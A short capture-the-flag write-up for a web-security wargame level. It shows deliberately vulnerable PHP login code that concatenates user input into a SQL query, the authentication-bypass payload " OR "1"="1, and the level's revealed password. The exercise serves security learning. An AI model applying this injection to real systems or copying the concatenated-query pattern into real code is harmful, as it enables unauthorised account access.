# Writeup level 14
We have a login form as the start page with the input fields username and password.

**Source Code**

```
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```

This looks like a simple **SQL-Injection**. We can see that the query is getting concatenated with our input. So we can easily inject our own SQL statement since there is nothing protecting it. Also we have a debug option which we can use to see how our query looks like.

**Exploit**  
In this case we can simply use **natas15** as the **username** and our password is going to be the injection point.  
By using: **" OR "1"="1**as the **password** we can turn the condition to true without knowing the password.  
Query that gets executed:  
```sql
SELECT * from users where username="natas15" and password="" OR "1"="1"
```

The password is:  
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

